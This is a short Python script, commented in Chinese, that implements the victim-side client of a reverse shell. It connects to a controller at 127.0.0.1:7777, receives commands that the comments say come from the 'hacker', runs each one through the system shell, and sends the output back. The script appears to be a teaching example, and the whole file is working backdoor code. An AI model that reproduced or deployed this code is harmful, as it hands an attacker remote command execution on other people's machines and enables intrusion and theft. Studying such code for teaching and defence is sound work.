import socket,struct,subprocess



#受害者 被控端 执行命令
def cmd_exec(cmd):
    obj = subprocess.Popen(cmd, shell=True,
                        stdout=subprocess.PIPE, # 标准正确输出
                        stderr=subprocess.PIPE) # 标准错误输出
    res = obj.stdout.read()
    res_err = obj.stderr.read()
    return res.decode("gbk")+res_err.decode("gbk")
def recv_data(sock, buf_size=1024):
    """解决粘包"""
    # 先接受长度
    x = sock.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data
def send_data(sock, data):
    """发送数据也解决粘包问题"""
    if type(data) == str:
        data = data.encode("utf-8")
    # 计算数据长度 , 打包发送
    cmd_len = struct.pack('i', len(data))
    sock.send(cmd_len)
    # 发送数据
    sock.send(data)

#1、实例化一个socket对象
#AF_INET 表示基于网络通信 SOCK_STREAM 表示 TCP
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#2、连接目标
sock.connect(("127.0.0.1",7777))
while True:
    #3、接收hacker的命令
    cmd = recv_data(sock).decode("utf-8")
    if cmd == "q": break
    #4、客户端发送数据
    data = cmd_exec(cmd)
    send_data(sock,data)
#5、关闭连接
sock.close()